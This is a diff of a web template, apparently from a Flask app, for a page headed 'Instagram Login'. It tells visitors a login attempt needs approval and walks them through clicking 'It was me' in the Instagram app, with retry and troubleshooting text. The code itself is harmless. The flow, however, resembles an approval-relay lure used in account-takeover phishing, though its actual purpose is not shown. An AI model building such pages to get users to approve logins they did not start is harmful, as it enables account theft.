@@ -9,18 +9,46 @@
     <div class="container">
         <h1>Instagram Login</h1>
         <p>Instagram requires approval for this login attempt.</p>
-        <p>✅ A notification has been sent to your Instagram app or email.</p>
-        <p>Please open Instagram and approve the login attempt.</p>
-        <p>You should see a notification asking you to confirm it's you.</p>
-        <div style="margin: 20px 0;">
-            <img src="{{ url_for('static', filename='confirm.png') }}" alt="Confirm Login" style="max-width: 100%; height: auto;">
+        <p>✅ An approval request has been initiated.</p>
+        
+        <div class="tips">
+            <h4>Instructions:</h4>
+            <ol>
+                <li>Check your Instagram app for a notification about a login attempt</li>
+                <li>If no notification appears, check your email associated with Instagram</li>
+                <li>Look for a message asking "Was this you?" with confirmation buttons</li>
+                <li>Click "It was me" or the equivalent confirmation option</li>
+            </ol>
         </div>
+
+        <div style="margin: 20px 0;">
+            <button type="button" id="retry-btn">Retry sending verification request</button>
+        </div>
+        
         <form method="POST">
             <button type="submit">I've approved the login</button>
         </form>
+        
         {% if error %}
             <p class="error">⚠️ {{ error }}</p>
         {% endif %}
+        
+        <div class="tips" style="margin-top: 20px;">
+            <h4>Troubleshooting:</h4>
+            <ul>
+                <li>Make sure you're logged into the correct Instagram account on your device</li>
+                <li>Check both your notifications and email for the verification message</li>
+                <li>If you don't see any notifications, try clicking the "Retry" button above</li>
+                <li>Sometimes Instagram sends a code instead - in that case, you'll need to log in again</li>
+            </ul>
+        </div>
     </div>
+
+    <script>
+        // Add retry functionality
+        document.getElementById('retry-btn').addEventListener('click', function() {
+            window.location.reload();
+        });
+    </script>
 </body>
 </html>
